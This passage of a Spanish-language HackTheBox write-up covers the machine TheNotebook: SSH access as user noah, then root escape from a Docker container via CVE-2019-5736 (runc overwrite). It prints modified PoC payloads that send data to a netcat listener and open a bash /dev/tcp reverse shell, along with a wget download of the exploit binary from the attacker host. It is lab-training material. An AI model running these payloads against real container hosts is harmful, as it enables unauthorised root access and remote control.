+HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
+rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
+...
+❭ chmod 400 key_noah
+</code></pre>
+
+<p>Y ejecutamos hacia la máquina:</p>
+
+<pre><code class="language-bash">❭ ssh noah@10.10.10.230 -i key_noah 
+load pubkey "key_noah": invalid format
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320bash_SSH_noah.png" alt="320bash_SSH_noah" /></p>
+
+<p>Nice, somos <code>noah</code> y tenemos acceso a la flag <code>user.txt</code>.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si vemos los permisos que tenemos como <code>root</code>, encontramos:</p>
+
+<pre><code class="language-bash">noah@thenotebook:/dev/shm$ sudo -l
+Matching Defaults entries for noah on thenotebook:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User noah may run the following commands on thenotebook:
+    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+</code></pre>
+
+<p>El usuario <code>noah</code> puede ejecutar comandos inicialmente en el contenedor <code>webapp-dev01</code> y dado el caso en todos los contenedores que empiecen con <code>webapp-dev01</code>, veamos que hay dentro, ejecutemos una <code>bash</code> en el container:</p>
+
+<pre><code class="language-bash">noah@thenotebook:/dev/shm$ sudo /usr/bin/docker exec -it webapp-dev01 bash
+root@c8d1914f59cd:/opt/webapp# ls -la
+total 52
+drwxr-xr-x 1 root root 4096 Feb 12 07:30 .
+drwxr-xr-x 1 root root 4096 Feb 12 07:30 ..
+drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__
+drwxr-xr-x 3 root root 4096 Nov 18 13:27 admin
+-rw-r--r-- 1 root root 3303 Nov 16 19:43 create_db.py
+-rw-r--r-- 1 root root 9517 Feb 11 15:00 main.py
+-rw------- 1 root root 3247 Feb 11 15:09 privKey.key
+-rw-r--r-- 1 root root   78 Feb 12 07:12 requirements.txt
+drwxr-xr-x 3 root root 4096 Nov 19 10:57 static
+drwxr-xr-x 2 root root 4096 Nov 18 13:47 templates
+-rw-r--r-- 1 root root   20 Nov 20 09:18 webapp.tar.gz
+</code></pre>
+
+<p>Bien, tenemos la estructura y todos los archivos que usa para el servidor web de las notas… Pero enumerando no encontramos nada relevante, así que regresemos y volvamos a enumerar…</p>
+
+<p>Si vemos la versión actual de Docker obtenemos la <code>18.06.0-ce</code>:</p>
+
+<pre><code class="language-bash">noah@thenotebook:~$ docker -v
+Docker version 18.06.0-ce, build 0ffa825
+</code></pre>
+
+<p>Buscando vulnerabilidades sobre ella, encontramos el CVE <a href="https://www.cvedetails.com/cve/CVE-2019-5736/">CVE-2019-5736</a>:</p>
+
+<ul>
+  <li><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-13534/product_id-28125/Docker-Docker.html"><strong>Docker 18.06.0-ce</strong> Vulnerabilities</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_CVE_docker18-16-0-ce.png" alt="320google_CVE_docker18-16-0-ce" /></p>
+
+<p>Nos indica que el binario <code>runc</code> (que se ejecuta cuando «ejecutamos» <code>Docker</code>) es vulnerable a ser sobreescrito y por consiguiente indicarle comandos para que sean ejecutados como el usuario <code>root</code> en la máquina host :O</p>
+
+<blockquote>
+  <p><code>runC</code>: <a href="https://opensource.com/life/16/8/runc-little-container-engine-could">“command-line tool for spawning and running containers”</a>.</p>
+</blockquote>
+
+<p>Nice, busquemos referencias de exploits a ver cuál podemos usar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_CVE_docker18-16-0-ce_githubLIST.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Tenemos varios, dándole unos ojazos, el más sencillo de entender es el de <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">Frichetten</a>, esta hecho en <code>.go</code> y solo debemos mover un archivo al sistema, metámosle candela:</p>
+
+<ul>
+  <li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a>.</li>
+</ul>
+
+<p>Lo clonamos en nuestra máquina y vemos el archivo <code>main.go</code>, explorándolo simplemente debemos modificar la variable <code>payload</code>, como prueba haré que nos envíe el resultado del comando <code>hostname</code> a nuestro listener en <code>nc</code>:</p>
+
+<pre><code class="language-go">...
+// This is the line of shell commands that will execute on the host
+var payload = "#!/bin/bash \n hostname | nc 10.10.14.194 4433"
+...
+</code></pre>
+
+<p>Bajando un poco (y leyendo el repo) nos indica lo que hará. Tomará el binario <code>/bin/sh</code> y lo sobreescribirá para que una vez sea ejecutado <code>Docker</code> este llame el binario <code>runC</code> y este a su vez sobreescriba el contenido del binario <code>/bin/sh</code> para que se transforme en el contenido de nuestra variable <code>payload</code> (o sea el comando <code>hostname</code> en este caso). Pero veremos la ejecución del payload una vez hagamos el llamado del binario <code>/bin/sh</code> (que en esta parte ya estaría modificado) en el contenedor (para esto necesitaremos otra Shell con el usuario <code>noah</code>, para primero ejecutar el binario <code>main</code> y por segundo ejecutar la explotación (el binario <code>/bin/sh</code>)).</p>
+
+<p>Listo, guardamos y creamos el binario:</p>
+
+<pre><code class="language-bash">❭ go build main.go #Genera el binario "main"
+❭ ls
+main  main.go  README.md  screenshots
+</code></pre>
+
+<p>Listos, ahora podemos subirlo al contenedor, creemos un servidor en <code>Python</code> y de paso pongámonos en escucha con <code>nc</code>:</p>
+
+<pre><code class="language-py">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>En la máquina víctima indicamos:</p>
+
+<pre><code class="language-bash">noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
+root@c6d778ee6b03:/opt/webapp# cd /dev/shm
+# Descargamos el binario a la máquina
+root@c6d778ee6b03:/dev/shm# wget http://10.10.14.194:8000/main
+...
+root@c6d778ee6b03:/dev/shm# ls -la
+total 2220
+drwxrwxrwt 2 root root      60 Mar 16 19:58 .
+drwxr-xr-x 5 root root     360 Mar 16 19:16 ..
+-rw-r--r-- 1 root root 2269904 Mar 16 19:42 main
+# Damos permisos de ejecución
+root@c6d778ee6b03:/dev/shm# chmod +x main
+root@c6d778ee6b03:/dev/shm# ls -la
+total 2220
+drwxrwxrwt 2 root root      60 Mar 16 19:58 .
+drwxr-xr-x 5 root root     360 Mar 16 19:16 ..
+-rwxr-xr-x 1 root root 2269904 Mar 16 19:42 main
+</code></pre>
+
+<p>Acá estuve perdido un rato, ya que no lograba ejecutarlo:</p>
+
+<pre><code class="language-bash">root@c6d778ee6b03:/dev/shm# ./main
+bash: ./main: Permission denied
+root@c6d778ee6b03:/dev/shm# bash main 
+main: main: cannot execute binary file
+...
+</code></pre>
+
+<p>Dándole vueltas, desistí de ese script y usé otros repositorios, pero no conseguía ejecutar NADA (¿ya puedes imaginar por qué?)…</p>
+
+<p>Pues resulta que si hacemos el mismo procedimiento, pero en el directorio  <code>/tmp</code> o incluso en el directorio <code>/opt/webapp</code>, ahí si me permite ejecutarlo 🙃</p>
+
+<p>Claramente por permisos que no entiendo, pero pues X:</p>
+
+<pre><code class="language-bash">root@c6d778ee6b03:/dev/shm# mv main /tmp/
+root@c6d778ee6b03:/dev/shm# cd /tmp/
+root@c6d778ee6b03:/tmp# ls -la
+total 2264
+drwxrwxrwt 1 root root    4096 Mar 16 20:05 .
+drwxr-xr-x 1 root root    4096 Mar 16 19:16 ..
+-rwxr-xr-x 1 root root 2269904 Mar 16 19:42 main
+-rw-r--r-- 1 root root      78 Feb 12 07:12 requirements.txt
+-rw-r--r-- 1 root root   32768 Feb 12 07:30 webapp.db
+</code></pre>
+
+<p>Ejecutamos:</p>
+
+<pre><code class="language-bash">root@c6d778ee6b03:/tmp# ./main 
+[+] Overwritten /bin/sh successfully
+</code></pre>
+
+<p>Y se queda a la espera de la ejecución del binario <code>/bin/sh</code>, así que abrimos la otra sesión con <code>SSH</code> y volvemos a ejecutar el archivo <code>main</code>, pero ahora en la nueva Shell indicamos:</p>
+
+<pre><code class="language-bash">noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+</code></pre>
+
+<p>Y en la sesión donde esta corriendo el binario <code>main</code> obtenemos:</p>
+
+<pre><code class="language-bash">root@867e71dd120c:/tmp# ./main 
+[+] Overwritten /bin/sh successfully
+[+] Found the PID: 66
+[+] Successfully got the file handle
+[+] Successfully got write handle &amp;{0xc0000aa8a0}
+root@867e71dd120c:/tmp# 
+</code></pre>
+
+<p>Yyyy en nuestro listener:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+10.10.10.230: inverse host lookup failed: Host name lookup failure
+connect to [10.10.14.194] from (UNKNOWN) [10.10.10.230] 51878
+thenotebook
+</code></pre>
+
+<p>Perfectoooo, estamos hablando con el <code>host</code>, entablémonos una Reverse Shell:</p>
+
+<pre><code class="language-go">...
+var payload = "#!/bin/bash \n bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.194/4433 0&gt;&amp;1 &amp;'"
+...
+</code></pre>
+
+<ol>
+  <li>Compilamos.</li>
+  <li>Subimos binario <code>main</code> al contenedor.</li>
+  <li>Abrimos otra sesión <code>SSH</code>.</li>
+  <li>Ejecutamos el binario <code>main</code>.</li>
+  <li>Ejecutamos el binario <code>/bin/sh</code> en la nueva sesión.</li>
+  <li>Obtenemos nuestra Reverse Sheeeeeeeeeeeeeeell.</li>
+</ol>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320bash_revSH_root.png" alt="320bash_revSH_root" /></p>
+
+<p>Perfectooooooooooooooooooooooooooo, hacemos tratamiento de la <code>TTY</code> y procedemos a ver las flags:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">Savitar te explica el tratamiento de la <strong>TTY</strong></a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320flags.png" alt="320flags" /></p>
+
+<p>…</p>
+
+<p>Linda máquina, me fascino el inicio, por lo tanto me cree un script para que haga toooodo el proceso de cambiar la cookie, subir el archivo yyy ejecutar los comandos (:</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/thenotebook/RCE_phpfile.py"><strong>RCE</strong> mediante el archivo <strong>.php</strong></a></li>
+</ul>
+
+<p>Muy loco el tema de <code>Docker</code> y <code>runc</code>, y casi muero intentando ejecutar el binario en esa ruta :( Perooo bueno, se solucionó.</p>
+
+<p>Muchas gracias por pasarse y leerse este montón de texto :P Y nada, a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - TheNotebook&url=http://localhost:4000/htb/thenotebook" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#JWT">JWT</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#docker">docker</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#runc">runc</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#ssh-keys">ssh-keys</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/waldo">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/waldo">HackTheBox - Waldo</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
